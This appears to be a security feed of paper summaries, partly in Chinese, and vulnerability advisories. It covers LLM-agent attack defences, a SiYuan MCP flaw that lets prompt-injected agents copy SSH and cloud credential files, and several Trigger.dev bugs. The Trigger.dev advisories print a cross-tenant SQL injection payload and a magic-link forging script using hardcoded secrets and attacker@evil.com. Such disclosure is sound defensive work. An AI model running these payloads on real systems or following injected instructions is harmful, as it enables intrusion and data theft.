llm_summary.impact_zh: 适用于所有引入第三方/可复用 Skill、插件或工具包的 LLM Agent 平台,尤其是带有跨会话持久记忆、环境工件写入与多 Skill 串联编排能力的系统;其思路也可迁移到 MCP 工具集、RAG 知识库投毒与 Agent 工作流编排的供应链风险建模。
detection_signals_zh: 上游 Skill 通过常规工具调用写入文件、记忆或配置等持久化环境工件,且内容与当前用户请求无直接关联
下游 Skill 的高影响操作所依据的"理由"来自上游写入的环境状态而非用户原始指令
同一会话或跨会话中出现"环境状态变更 → 后续敏感操作"的因果链,二者由不同来源的 Skill 提供
Skill 之间存在未被声明的隐式数据依赖或参数耦合,单独审计时均无异常
持久化记忆/工件中出现指令性、任务导向的文本,而非用户或系统产生的内容
defense_advice_zh: 将 Skill 安全审计从单文件静态检查升级为跨 Skill 依赖图审计,覆盖上游写入与下游读取的完整链条
对 Agent 的持久化记忆、环境工件与文件写入做来源标记与内容审查,区分"数据"与"指令"
在执行高影响操作前做意图一致性校验:比对用户原始请求、当前情境理由与实际操作目标是否自洽
建立 Skill 来源信任分级与签名/审核机制,限制低信任 Skill 向持久化状态写入内容
对本平台 Agent 运行时做时序关联监控,重点覆盖上游低风险工具调用与下游高风险操作的配对模式

items.title: Speculative Safety Honeypot: Toward Proactive Defense Against Multi-turn Agent Attacks
items.summary: As Large Language Model (LLM) agents are increasingly deployed in complex environments, multi-turn interaction attacks have become a significant security challenge. Existing detection methods typically rely on historical context. However, this retrospective logic struggles to identify deep malicious intents that are split across turns to hide future risks. Inspired by speculative decoding, we propose the Speculative Safety Honeypot (SSH) framework. SSH uses a multi-agent simulation system composed of small LLMs to build an action-level speculate-and-verify workflow. In the speculation stage, SSH predicts future behaviors of the target agent and asynchronously builds a trajectory tree to expose potential risks in advance. In the verification stage, the system uses the target agent's real actions to calibrate and prune the trajectory tree, effectively reducing false positives. As a plug-and-playable component, SSH provides existing detectors with rich decision redundancy beyond the current interaction slice. By judging risk based on the evolution of the entire trajectory tree rather than a single point in time, the system reduces the reliance on the absolute precision of individual detection components. This improves the defense resilience and the warning lead-time of agent systems against complex temporal attacks.

llm_summary.summary_zh: 这篇论文关注的是 LLM Agent 在多轮交互场景下所面临的安全威胁。随着 Agent 被部署到越来越复杂的工具调用与环境交互中，攻击者可以把恶意意图拆散到多个对话轮次里，逐步诱导 Agent 走向危险行为，而任何单独一轮的输入看上去都无害。现有的检测方法大多依赖「回溯式」逻辑，即基于已经发生的历史上下文来判断当前动作是否可疑。论文指出这种范式存在结构性缺陷：当恶意意图被刻意切分、延后触发时，历史片段中并不存在足以支撑判定的证据，因此检测器会持续漏报，直到风险已经兑现。受推测解码（speculative decoding）中「先高速猜测、再精确验证」思路的启发，作者提出了 Speculative Safety Honeypot（SSH）框架。SSH 的核心是一个由多个小模型组成的多智能体模拟系统，构建动作级别（action-level）的「推测—验证」工作流。在推测阶段，SSH 让模拟智能体预测目标 Agent 未来可能采取的动作，并异步地生长出一棵「轨迹树」（trajectory tree），把尚未发生但可能发生的风险路径提前展开，从而获得超前的预警时间。在验证阶段，系统用目标 Agent 的真实动作对轨迹树进行校准与剪枝，剔除被现实证伪的分支，显著抑制误报。SSH 被设计为即插即用组件，可以挂接到已有检测器上，为其提供超出当前交互切片的决策冗余。其关键思想是：不再依赖某一时刻的单点判定，而是依据整棵轨迹树的演化趋势来评估风险，从而降低对单个检测组件绝对精度的依赖。论文声称该机制提升了 Agent 系统面对复杂时序攻击时的防御韧性与告警提前量。需要说明的是，当前仅获得摘要信息，具体实验设置、数据集、评测指标与量化提升幅度均未披露。
llm_summary.why_it_matters_zh: 多轮、跨轮次的意图拆分攻击是当前 Agent 防护的盲区，回溯式检测天然滞后。SSH 把「预测未来动作 + 用真实动作证伪」引入安全判定，为 SOC 在 Agent 场景下争取告警提前量提供了新思路，且强调即插即用、可与现有检测器叠加。
llm_summary.impact_zh: 适用于所有具备多轮工具调用能力的 Agent 平台：企业级 Copilot、自动化运维/编排 Agent、客服与业务流程 Agent、Agent 网关与运行时防护产品。可迁移到需要「提前预警 + 低误报」的时序型检测场景，也可作为现有护栏/内容审核模块的前置冗余层。
detection_signals_zh: 单轮输入均无害、但多轮组合后指向高风险工具或敏感数据访问的会话序列
对话中意图逐步漂移、目标被分步拆解后重新拼装的模式
目标 Agent 实际动作与预测轨迹树出现显著偏离，需要重新校准的时刻
轨迹树中高风险分支被真实动作反复证实的会话（高置信可疑）
同一会话内风险评分的演化趋势持续上升，而非单点跳变
defense_advice_zh: 在多轮 Agent 会话中引入「预测—验证」式的前瞻评估，而非仅回溯历史上下文
将安全判定粒度从单点扩展到整条会话轨迹的演化趋势，降低对单一检测器精度的依赖
把推测式组件作为可插拔层部署在现有护栏之前，用于生成告警提前量
对轨迹预测持续被真实动作证伪的分支及时剪枝，控制误报对告警疲劳的影响
针对跨轮次意图拆分攻击建立内部红队用例与回归评测集
记录并留存轨迹树与决策依据，便于事后审计与规则迭代

items.title: SEW: Style-Encoded Watermarking of LLM-Generated Code
items.summary: Code watermarking supports provenance tracking for code generated by LLMs. Modifying token selection to embed watermarks as an LLM generates code can create a trade-off between detectability and functional correctness. Other methods instead watermark completed code using predefined transformations or trained neural models. Recurring patterns can make watermark choices predictable across programs, while treating patterns common in unwatermarked code as watermark evidence can cause false detections. We therefore introduce SEW, which embeds and detects watermarks in already generated code through three components: (i) code style rules collected from style guides and transformation rules, with style choices determined by a secret key and each program's structural context; (ii) style-preference calibration, which evaluates watermark evidence using style probabilities estimated from human-written code; and (iii) context-aware style aggregation, which combines evidence from structurally matching locations assigned the same code style choice, preventing repeated applications of that choice from inflating watermark evidence. On CodeContests across three LLMs and three programming languages, SEW achieves a mean relative improvement of 12.44% in TPR@FPR5% over the baselines and is robust to four non-LLM code-editing attacks, with only a 0.94% mean relative decrease. Our code is available at https://github.com/suhanmen/SEW.

llm_summary.summary_zh: 该论文关注 LLM 生成代码的来源追踪(provenance)问题, 提出名为 SEW(Style-Encoded Watermarking)的代码水印方案。研究背景是: 现有代码水印大体分为两类路线——一类在模型生成过程中修改 token 选择来嵌入水印, 但可检测性与代码功能正确性之间存在明显权衡; 另一类对已经生成完毕的代码施加预定义变换或使用训练好的神经网络模型来打标记。作者指出后一类方法存在两个关键缺陷: 一是代码中反复出现的模式会让水印选择在不同程序之间变得可预测, 削弱隐蔽性; 二是把未加水印代码中本就常见的模式误当作水印证据, 会推高误报率。为此 SEW 设计了三个组件: (i) 代码风格规则, 从编程风格指南与转换规则中收集, 具体风格选择由密钥和每个程序自身的结构上下文共同决定, 因此不改变代码语义与功能正确性; (ii) 风格偏好校准, 利用从人类编写代码中估计出的风格概率来评估水印证据强弱, 从而抑制对自然常见风格的误判; (iii) 上下文感知的风格聚合, 只在结构上相互匹配、且被赋予同一风格选择的位置之间合并证据, 避免同一风格选择被反复应用而人为放大水印证据强度。实验在 CodeContests 数据集上覆盖 3 个 LLM 与 3 种编程语言, 相比基线在 TPR@FPR5% 上取得 12.44% 的平均相对提升; 同时对 4 种非 LLM 的代码编辑攻击保持鲁棒, 平均相对性能下降仅 0.94%。代码已开源。该工作适合研究 LLM 水印、AI 生成代码溯源、模型输出审计与合规检测的研究者与工程师阅读。
llm_summary.why_it_matters_zh: 随着 LLM 生成代码大规模进入生产仓库, 代码来源追踪、许可证合规与 AI 代码审计成为现实需求。SEW 在不改变代码语义的前提下于风格层嵌入水印, 并给出低误报(风格偏好校准)与防证据膨胀(上下文聚合)的工程化思路, 对构建企业级 AI 代码溯源与检测能力有直接参考价值。
llm_summary.impact_zh: 可迁移到 AI 生成代码的供应链溯源、内部代码审计、模型输出归属判定与合规取证场景; 其'用人类代码基线校准证据、按结构上下文聚合证据'的思路也可推广到文本水印与内容溯源系统的误报控制设计。
detection_signals_zh: 低误报率(如 FPR 5%)约束下的高检出率(TPR)是评估代码水印可用性的核心指标
按结构上下文匹配位置聚合的风格选择统计偏移, 可作为水印存在的证据来源
以人类编写代码估计的风格概率分布作为基线, 偏离基线的风格选择分布异常
水印证据对非 LLM 代码编辑操作的稳定性, 可作为区分水印信号与偶然风格差异的判据
defense_advice_zh: 在引入代码水印用于溯源时, 优先评估固定 FPR 下的 TPR 曲线, 而非仅看单一检出率
使用人类编写代码样本校准风格基线概率, 以抑制把常见风格误判为水印的假阳性
对同一风格选择在结构相同位置的重复出现做去重聚合, 避免证据被人为放大
将水印密钥纳入密钥管理与最小权限访问控制, 防止溯源能力失效

items.title: Homomorphic Advantage Operator: Stabilizing Reinforcement Learning Under Fully Homomorphic Encryption Constraints
items.summary: Privacy-preserving machine learning presents significant deployment challenges on the cloud for intelligent systems with confidential data. Fully Homomorphic Encryption (FHE) offers a compelling solution for secure computation, preserving data confidentiality of cloud computations. However, applying FHE to reinforcement learning (RL) requires replacing non-linear operations with polynomial approximations, which diverge catastrophically due to a unique recursive error phenomenon known as the Bellman drift. This article introduces the Homomorphic Advantage Operator (HAO), a stabilization framework designed to prevent polynomial approximation divergence in FHE-based deep RL. HAO adapts the zero-mean centering projection from advantage-based value estimation directly to temporal-difference (TD) targets. This linear projection annihilates the uniform state-value baseline that drives the Bellman drift, maintaining per-state action rankings while requiring zero additional non-linear multiplicative depth and avoiding expensive ciphertext bootstrapping. The proposed HAO framework was evaluated using a three-tier experimental methodology, including a tabular Markov Decision Process (MDP), an encrypted CartPole environment using real CKKS cryptographic operations, and a 20-node logistics routing benchmark with dense continuous features. The results demonstrate that the proposed HAO strictly bounds network pre-activations within the safe polynomial approximation domain. The proposed HAO RL agents achieved 0% boundary breaches across all random seeds used, whereas regularization alone (L2 weight decay and gradient clipping) breached the bound on 3 of 5 seeds and the unstabilized baseline did so in 83.8% of episodes. Finally, HAO agents improve optimal policy accuracy by 18.0 percentage points in tabular domains and remain stable when DP-SGD-style Gaussian noise is added to the clipped gradients.

llm_summary.summary_zh:
这是一篇 cs.AI 方向的论文，聚焦隐私保护机器学习在云端部署时面临的现实困境：当智能系统需要处理机密数据时，全同态加密（FHE）被视为兼顾机密性与可计算性的理想方案，因为它允许云侧直接对密文做计算而不泄露明文。然而要把 FHE 真正用于强化学习（RL），必须把神经网络中的非线性激活（如 ReLU、max 等）替换为多项式近似，而多项式只在有限的数值域内才可靠。作者指出，在这种替换下会出现一种特有的递归误差现象——Bellman drift（贝尔曼漂移），导致近似迅速偏离安全域并灾难性发散，使训练彻底失败。

为解决该问题，论文提出 Homomorphic Advantage Operator（HAO）稳定化框架。其核心思想是把基于优势函数（advantage）的价值估计中常用的零均值中心化投影，直接作用到时序差分（TD）目标上。该投影是一个线性变换，能够精确消去那个驱动 Bellman drift 的、对所有状态施加相同偏移的均匀状态价值基线，同时保留每个状态下的动作相对排序（即不改变最优策略的贪心选择）。由于它是线性的，不会增加额外的非线性乘法深度，也无需执行代价极其高昂的密文 bootstrapping，因而在 FHE 预算上几乎免费。

实验采用三层递进方法学验证：(1) 表格型马尔可夫决策过程（MDP）；(2) 使用真实 CKKS 同态加密运算的加密 CartPole 环境；(3) 一个 20 节点、具备密集连续特征的物流路由基准。结果显示 HAO 能把网络预激活严格限制在安全的多项式近似域内：在所有随机种子下边界越界率为 0%；相比之下，仅用正则化手段（L2 权重衰减加梯度裁剪）在 5 个种子中有 3 个越界，而未做稳定化的基线在 83.8% 的 episode 中出现越界。此外，HAO 智能体在表格域把最优策略准确率提升 18.0 个百分点，并且在裁剪梯度上叠加 DP-SGD 风格高斯噪声时仍保持稳定，说明该方法与差分隐私训练流程兼容。

论文的主要贡献是：识别并形式化了 FHE-RL 中多项式近似发散的根因（Bellman drift），给出一个线性、零额外密文开销的稳定化算子，并在真实同态加密运算与更大规模连续控制基准上验证了其有效性。适合隐私保护 ML / FHE 工程团队、云端机密计算部署方，以及研究 RL 训练稳定性与安全强化学习的读者。
llm_summary.why_it_matters_zh: FHE 是云端机密数据上跑 AI 的关键使能技术，而 RL 又是自动化决策的核心；该工作给出了在密文域内保持 RL 训练不发散的可行手段，对构建可用的隐私保护智能系统有直接工程价值。
llm_summary.impact_zh: 可迁移到需要在加密数据或可信执行环境中训练／微调决策模型的场景，例如云端机器人控制、跨机构物流与供应链调度、医疗或金融隐私数据上的策略学习；其零均值中心化到 TD 目标的技巧也可能被借鉴到一般 RL 的数值稳定化与低精度／量化训练中。
defense_advice_zh: 若计划在云端开展隐私保护 RL 训练，应在评估阶段监控预激活数值范围与多项式近似域边界的越界率，把越界率作为首选训练健康度指标。
在 FHE 训练流水线中同时保留正则化与稳定化算子，但不要只依赖 L2 权重衰减和梯度裁剪——本研究表明单独正则化的稳定性不足。
在引入 DP-SGD 等隐私噪声时，重新验证稳定化效果，确认噪声不会把预激活推出多项式安全域。
对加密推理服务而言，仍应把密文计算组件视作普通第三方组件做依赖与供应链管理，避免因云侧实现缺陷导致机密性假设失效。
llm_summary.recommended_action_zh: 研究跟进：阅读原文并用小规模环境复现越界率与策略准确率对比，评估是否可在自有隐私保护训练栈中引入该稳定化思路。

items.title: Towards Hierarchical Cyber Defense with Large Language Models: From Planning to Execution
items.summary: An autonomous cyber defender trained with reinforcement learning (RL) is typically tied to the network on which it was trained, limiting its ability to generalize as network scale changes. Hierarchical RL reduces decision complexity by separating strategic targeting from tactical execution, but it does not eliminate this retraining dependence. We investigate whether frozen, zero-shot large language models (LLMs) can provide retraining-free control in hierarchical cyber defense and how performance changes as LLM control is extended from planning to execution. We formulate a controller-agnostic planner-executor hierarchy in which the planner selects a subnet to defend over a fixed horizon and the executor selects defensive actions within that subnet. Using the high fidelity Cyberwheel environment, with its built-in automated red team agent mapped to the MITRE ATT&CK framework, we compare RL+RL, LLM+RL, and LLM+LLM configurations using six models ranging from 3B to 70B parameters, including two cybersecurity-specialized models, across small, medium, and large networks. Replacing only the planner with an LLM yields limited gains as network size increases. In contrast, extending LLM control to execution produces notable improvements for sufficiently capable models. For instance, a frozen general purpose 70B model holds successful lateral movement to approximately 1% of steps and attacker impact near zero across all three network scales using the same model weights, while the RL baseline is retrained for each scale. Our results show that sufficiently capable frozen LLMs can maintain strong defensive performance across the evaluated network scales without task-specific retraining, while also indicating that strong tactical execution is important to realizing the benefits of LLM-based control.

llm_summary.summary_zh: 本篇论文研究自主网络防御中强化学习(RL)防御智能体的泛化瓶颈：用 RL 训练出的自主防御者通常与其训练所在的网络绑定，一旦网络规模发生变化，策略能力就会下降，往往需要按新规模重新训练。分层强化学习通过把"战略层目标选择"与"战术层动作执行"拆开，降低了决策复杂度，但并未消除这种对重训练的依赖。作者进而提出一个关键问题：冻结的、零样本(zero-shot)大语言模型(LLM)能否在分层网络防御中提供免重训练的控制能力，以及当 LLM 的控制范围从规划层扩展到执行层时性能会如何变化。为此，论文形式化了一个"控制器无关"的规划器-执行器(planner-executor)层级结构：规划器在固定时间窗内选择一个需要防御的子网，执行器则在该子网内部选择具体防御动作，规划器与执行器可以分别由 RL 或 LLM 担任。实验在高保真 Cyberwheel 环境中进行，该环境内置了映射到 MITRE ATT&CK 框架的自动化红队智能体，用于模拟攻击者的横向移动与影响。作者在小型、中型、大型三种网络规模上，比较了 RL+RL、LLM+RL、LLM+LLM 三类配置，共使用 3B 到 70B 参数区间的六个模型，其中包含两个网络安全专用模型。结果显示：只把规划器替换为 LLM 时，随着网络规模增大，收益有限；而将 LLM 控制扩展到执行层后，能力足够强的模型出现明显提升。例如一个冻结的通用 70B 模型在三种网络规模下复用同一套权重，即可将成功的横向移动压制到约 1% 的步数、攻击者影响接近零，而 RL 基线必须针对每种规模分别重新训练。结论是：能力足够强的冻结 LLM 可以在所评估的网络规模范围内保持较强的防御表现而无需任务特定重训练，同时也说明强大的战术执行层是真正兑现 LLM 控制收益的必要条件。
llm_summary.why_it_matters_zh: 为防御方提供了"免重训练"的分层自主防御思路：网络规模变化时同一套模型权重仍可复用，对多子网、大规模企业环境的安全编排与自动化响应有参考价值；同时提示评估 LLM 控制器时必须连执行层一起考察，否则会误判其能力边界。
llm_summary.impact_zh: 可迁移到 SOAR 与自主防御代理的决策层设计、多子网企业网络的动态防御调度、以及需要跨网络规模复用的控制策略构建；但结论基于 Cyberwheel 仿真环境，向真实网络的迁移性仍待验证。
detection_signals_zh: Cyberwheel 等仿真环境中自动化红队智能体的横向移动与影响遥测
LLM 控制器输出的子网选择决策与子网内防御动作序列日志
defense_advice_zh: 把 LLM 作为规划层单独使用收益有限，评估时应同时考察其承担战术执行层的能力
在引入 LLM 防御控制器前，先在自有仿真/靶场中验证跨网络规模的免重训练表现
将攻击行为对照 MITRE ATT&CK 进行映射，以便横向移动压制效果可量化对比
保留 RL 基线作为对照，避免把规模变化带来的评估偏差误判为 LLM 增益

items.title: SiYuan MCP asset.upload Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass)
items.summary:
# Security Advisory — SiYuan MCP `asset.upload` Reads Arbitrary Absolute File Paths (Workspace Boundary Bypass)

| Field | Value |
|---|---|
| **Disclosed by** | joysinleung (`joysinleung@gmail.com`) |
| **Report date** | 2026-08-13 |
| **Product** | SiYuan (思源笔记) — `siyuan-note/siyuan` |
| **Go module** | `github.com/siyuan-note/siyuan/kernel` |
| **Affected versions** | `<= 3.8.0` (latest release at report time; statically confirmed on v3.8.0) |
| **Patched versions** | 3.8.1 |
| **Component** | `kernel/mcp/tools/asset.go` (`assetUpload`), `kernel/model/upload.go` (`InsertLocalAssets`) |
| **Relationship to prior advisory** | **Residual of CVE-2026-66012** (GHSA-cvhv-7xhj-xjp8) MCP remediation. See §Relationship. |
| **EPSS (exploitation probability)** | Low. Requires the AI Agent to invoke `asset.upload` and the user to approve the (category-level) confirmation; reachable via prompt-injection of the agent. |
| **KEV (CISA Known Exploited)** | No (not listed in CISA KEV at report time). |
| **Default-config reachable** | **Partial** — requires the Agent/MCP surface to be configured (admin) and a user approval click; the boundary check itself is entirely absent, so any approved upload reads outside the workspace. |

---

## Summary

SiYuan exposes a native MCP tool `asset` → `asset.upload`. Its `files` argument is documented as a **comma-separated list of absolute file paths**. The handler (`kernel/mcp/tools/asset.go:195`) only normalizes each entry with `filepath.Abs(...)` — it performs **no workspace boundary check** (`IsSubPath`) and **no sensitive-path check** (`IsSensitivePath`). The downstream `model.InsertLocalAssets` (`kernel/model/upload.go:97`) then `os.Open`s each path and copies its bytes into the workspace `assets/` directory.

Every other AI-plane file primitive in SiYuan is workspace-constrained:
- `file` / `unzip` tools resolve paths via `resolvePath` (workspace-relative, escape-proof).

`asset.upload` is the **only** AI tool that accepts arbitrary absolute paths with zero boundary validation. An attacker who can steer the Agent (prompt injection) can induce it to upload sensitive files — e.g. `/Users/victim/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd` — into the workspace, from where they are reachable via notes / export / sync.

## Relationship to Prior Advisories

- **CVE-2026-66012** (GHSA-cvhv-7xhj-xjp8) remediated the MCP endpoint by requiring `CheckAdminRole` on `/mcp` and adding `refuseToAccess` for `conf/conf.json` in the *file* tool. However, the **`asset.upload` tool was never given a workspace boundary check** — it still accepts and reads any absolute path. This is a **residual boundary omission** from that remediation: the admin gate restricts *who* may call MCP, but does not constrain *which files* `asset.upload` may read. We report it as the unpatched half of the MCP file-surface hardening.

## Affected Version

Statically confirmed on the latest release **v3.8.0** (tag `v3.8.0`, commit `251596fc0`):
- `kernel/mcp/tools/asset.go:195` `assetUpload`: `abs, _ := filepath.Abs(strings.TrimSpace(f))` — normalization only.
- `kernel/model/upload.go:97` `InsertLocalAssets`: iterates the path list and `os.Open(assetAbsPath)` → `writeAssetFile(writePath, ...)` into `assetsDirPath`; the `IsSubPath(assetsDirPath, assetAbsPath)` check at line 130 is **only a dedup guard**, not a boundary limit. No workspace/external restriction is applied.

## Component

- `kernel/mcp/tools/asset.go:195` — `assetUpload` (`files` arg → `filepath.Abs` only).
- `kernel/model/upload.go:97` — `InsertLocalAssets` (`os.Open` + copy to `assets/`).
- Contrast (safe): `kernel/mcp/tools/unzip.go:52` `unzipHandler` uses `resolvePath` (workspace-relative, escape-proof).

## Attack Vector

**AI Agent / prompt injection.** Victim lets the Agent process attacker-controlled web/note content → agent is induced to call `asset.upload` with `/Users/victim/.ssh/id_rsa` (or similar) as a `files` entry. The user sees a **category-level** confi

items.title: sqlite3-ruby: Use-After-Free in SQLite Aggregate Arguments in Heap-Allocated Argument Array
items.summary:
## Summary

Using `Database#create_aggregate`, `#create_aggregate_handler`, or `Database#define_aggregator` to define an aggregate function that takes two or more arguments, and then evaluating it over TEXT or BLOB column values, can free the Ruby objects holding those arguments while a later argument is still being converted, during ordinary garbage collection. The aggregate's `step` method then receives an incorrect object, or the process crashes with a segmentation fault.

## Mitigation

Upgrade to sqlite3 gem v2.9.6 or later.

There is no reliable workaround. If you cannot upgrade, avoid defining aggregate functions that take two or more arguments. Restricting column value sizes is not a mitigation: smaller values make the defect fire less often but do not prevent it.

## Severity

The sqlite3-ruby maintainers assess this as Medium severity (CVSS 4.0 score 6.3). It is reached through ordinary garbage collection without any unusual code structuring: an application is exposed whenever it evaluates a multi-argument aggregate over TEXT or BLOB values whose size an attacker can influence. The demonstrated impact is an incorrect value passed to the aggregate's `step` method, or a process crash; no controlled memory write or general denial-of-service exploit has been demonstrated.

## Credits

Reported by Jeremy Daer ([@jeremy](https://github.com/jeremy)).

items.title: Trigger.dev: Trigger CLI debug deployment logs expose resolved environment secret values
items.summary:
Affected version: trigger.dev 4.5.3 (4.5.6 was advertised by the CLI but was not tested).

A staging dry-run executed with `trigger.dev deploy --env staging --dry-run --log-level debug`. The debug output logged the complete build-worker options object. Its `envVars` property contained unredacted values for every resolved staging variable, including database connection strings and service credentials. The non-debug environment listing correctly hides values, so users can reasonably expect deployment logs not to print secrets.

Impact: anyone with access to a developer terminal transcript, CI debug log, captured agent/tool output, or support bundle can recover deployment secrets even though no deployment occurs.

Reproduction:
1. Configure a Trigger.dev project with a secret environment variable.
2. Run the command above with an authenticated profile.
3. Inspect the `Starting buildWorker` debug record.
4. `options.envVars` contains the plaintext value.

No real credential is included in this report. The observed customer credentials are being rotated separately.

Suggested remediation: never serialize `envVars` values in debug output; log names only or replace every value with a fixed marker. Add regression coverage for deploy, dry-run, and debug logging, and review adjacent debug records for resolved secrets.

items.title: Trigger.dev: Cross-tenant SQL injection in the TSQL query compiler (POST /api/v1/query) via unsanitized window-function name
items.summary:
### Summary

A cross-tenant SQL injection in the TSQL query compiler lets **any authenticated trigger.dev customer read every other tenant's analytics data**. The customer-facing query endpoint `POST /api/v1/query` accepts a TSQL/TRQL query that is compiled to ClickHouse SQL by `internal-packages/tsql`. The compiler parameterizes or escapes all user input and injects a per-tenant `WHERE` guard — **except the window-function name**, which is concatenated into the SQL string with no allowlist and no escaping. By smuggling a backtick-quoted identifier into that position, an attacker injects a raw subquery (e.g. `(SELECT ... FROM task_runs_v2 WHERE organization_id = 'org_VICTIM')`) that sits **outside** the tenant guard, exfiltrating another organization's rows. Verified end-to-end against the real compiler and a live ClickHouse.

### Details

**Vulnerable sink** — `internal-packages/tsql/src/query/printer.ts:3073-3075`, `ClickHousePrinter.visitWindowFunction`:

```ts
private visitWindowFunction(node: WindowFunction): string {
  const args = node.args ? node.args.map((a) => this.visit(a)) : [];
  const funcCall = `${node.name}(${args.join(", ")})`;   // <-- node.name concatenated RAW
  ...
}
```

`node.name` is emitted directly into the SQL with **no allowlist check and no identifier escaping**. This is the only place in the compiler where an attacker-influenced identifier reaches the output unguarded:

- The normal function-call path `visitCall` (`printer.ts:2951`) throws `Unknown function` for any name outside the hardcoded `TSQL_CLICKHOUSE_FUNCTIONS` / `TSQL_AGGREGATIONS` allowlists — **this gate is absent on the window-function path**.
- String constants are bound as ClickHouse `query_params` (parameterized).
- Other identifiers go through `escapeClickHouseIdentifier`.
- Table functions (`url()/file()/remote()/s3()`) are rejected.

A **backtick-quoted identifier** is accepted by the lexer and **unescaped** into `node.name` by `visitIdentifier` (the backticks are stripped and the inner text is unescaped), so arbitrary characters — spaces, `(`, `)`, `,`, `'`, a full subquery — become the "function name" and are printed verbatim.

**How it bypasses tenant isolation.** Multi-tenancy is enforced only by `enforcedWhereClause`, which is attached to the **outer** table's `WHERE` (`organization_id`/`project_id`/`environment_id` taken from the caller's API key). An injected **subquery** has no such guard, so it reads across all tenants.

**Reachability** — `apps/webapp/app/routes/api.v1.query.ts`:
- `body.query` is a raw `z.string()`.
- Auth is any environment-scoped credential — a private API key or a public JWT — i.e. **any signed-up customer**.
- The route's authorization (`detectTables(body.query)` + `everyResource`) only authorizes the **outer `FROM` table** the caller is legitimately allowed to read. The injection rides in the SELECT/window position, so it is invisible to that check.
- `executeQuery` passes the caller's `organizationId/projectId/environmentId` into the enforced `WHERE`. The compiled `sql` string is then sent to ClickHouse (`internal-packages/clickhouse/src/client/tsql.ts`) with the injected subquery embedded **in the SQL string itself** (not in bound params), so ClickHouse executes it.

### PoC

Reproduced in two stages: (1) the project's real `compileTSQL` emits the injection; (2) a live ClickHouse executes it and returns another tenant's data.

**1. Attacker TSQL input** (sent as the `query` field to `POST /api/v1/query` with any valid API key / JWT, authenticated here as `tenant1`):

```sql
SELECT `count() OVER (), (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2 WHERE organization_id = 'org_OTHER_TENANT') AS stolen, dummy(`() OVER () AS x FROM task_runs
```

**2. Compiled ClickHouse SQL emitted by `compileTSQL` (verbatim):**

```sql
SELECT count() OVER (),
       (SELECT groupArray(payload) FROM trigger_dev.task_runs_v2
        WHERE organization_id = 'org_OTHER_TENANT') AS stolen,        -- INJECTED,

items.title: Trigger.dev: Unauthenticated Realtime Stream Data Injection via Run FriendlyId
items.summary:
## Summary

The POST handler for `/realtime/v1/streams/:runId/:streamId` has no authentication. Any entity that knows or guesses a run friendlyId can inject arbitrary data into its realtime stream.

## Vulnerability Details

**File:** `apps/webapp/app/routes/realtime.v1.streams.$runId.$streamId.ts`

The `action` handler (line 17) has no auth wrapper. The code comment says: "Plain action for backwards compatibility with older clients that don't send auth headers."

The run lookup at line 29 uses `where: { friendlyId: runId }` with NO environment scoping (`runtimeEnvironmentId` is not checked), so production runs are accessible.

Run friendlyIds follow predictable patterns (e.g., `run_1234abcd`).

## Steps to Reproduce

```bash
# No authentication required
curl -X POST "http://localhost:8030/realtime/v1/streams/run_KNOWN_ID/stream_1"   -H "Content-Type: application/json"   -d '{"injected": "data"}'
```

## Impact

Unauthenticated data injection into any run realtime stream. Cross-environment access (no scoping).

items.title: Trigger.dev Self-Hosted Deployment: Default Secrets allow Unauthenticated Infrastructure Compromise
items.summary:
## Summary

Self-hosted trigger.dev v4 instances deployed using the provided Docker Compose configuration with default secrets from `hosting/docker/.env.example` are vulnerable to a multi-stage unauthenticated attack chain leading to complete infrastructure compromise.

## Vulnerability Details

The `hosting/docker/.env.example` file contains hardcoded cryptographic secrets:

```
SESSION_SECRET=2818143646516f6fffd707b36f334bbb
MAGIC_LINK_SECRET=44da78b7bbb0dfe709cf38931d25dcdd
ENCRYPTION_KEY=f686147ab967943ebbe9ed3b496e465a
MANAGED_WORKER_SECRET=447c29678f9eaf289e9c4b70d3dd8a7f
```

The `MAGIC_LINK_SECRET` is used by `remix-auth-email-link@2.0.2` to create authentication tokens via CryptoJS AES encryption. An attacker who knows this secret can forge valid magic links that authenticate as any email address without email delivery. The `validateSessionMagicLink` option defaults to `false` in the library (never overridden by trigger.dev), so no session-side validation occurs. User accounts are auto-created when `WHITELISTED_EMAILS` is not set (the default for self-hosted).

## Steps to Reproduce

### Setup
```bash
cd hosting/docker && cp .env.example .env
cd webapp && docker compose up -d
cd ../worker && docker compose up -d
```

### Step 1: Forge magic link token
```javascript
const CryptoJS = require('crypto-js');
const secret = '44da78b7bbb0dfe709cf38931d25dcdd';
const payload = JSON.stringify({e: 'attacker@evil.com', c: Date.now()});
const token = encodeURIComponent(CryptoJS.AES.encrypt(payload, secret).toString());
console.log('https://target:8030/magic?token=' + token);
```

### Step 2: Authenticate via forged magic link
```bash
curl -v "http://localhost:8030/magic?token="
# Returns: HTTP 302, set-cookie: __session=eyJ1c2VyIjp7InVzZXJJZCI6ImNtcGg3OTBxZjAwMDR0bjU1ZWM3bHlxN2EifX0=...
# User auto-created, session cookie set, redirects to /orgs/new
```

### Step 3: Verify database access from runner network
```bash
docker run --rm --network webapp postgres:14 psql "postgresql://postgres:unsafe-postgres-pw@postgres:5432/main" -c "SELECT id, email FROM \"User\";"
# Returns: cmph790qf0004tn55ec7lyq7a | attacker@evil.com
```

### Step 4: Verify Redis access (no auth)
```bash
docker run --rm --network webapp redis:7 redis-cli -h redis PING
# Returns: PONG
```

### Step 5: Verify ClickHouse access
```bash
docker run --rm --network webapp curlimages/curl curl -s "http://default:password@clickhouse:8123/?query=SELECT%20version()"
# Returns: 25.5.2.47
```

## Root Cause

1. Hardcoded secrets in `hosting/docker/.env.example` (lines 9-12)
2. Runner containers placed on infrastructure networks: `DOCKER_RUNNER_NETWORKS: webapp,supervisor` in `hosting/docker/worker/docker-compose.yml:42`
3. Default credentials on all infrastructure services
4. No Redis authentication
5. SESSION_SECRET reused for JWT signing (`apps/webapp/app/services/apiAuth.server.ts:616`) and impersonation tokens

## Impact

Complete infrastructure compromise: all tenant data, API keys, encrypted secrets (decryptable with known ENCRYPTION_KEY), user accounts, cross-tenant access. Attacker can modify data, push backdoored Docker images to the registry, and manipulate job queues.

items.title: Trigger.dev: Blind SSRF via alert-channel webhook
items.summary:
### Summary

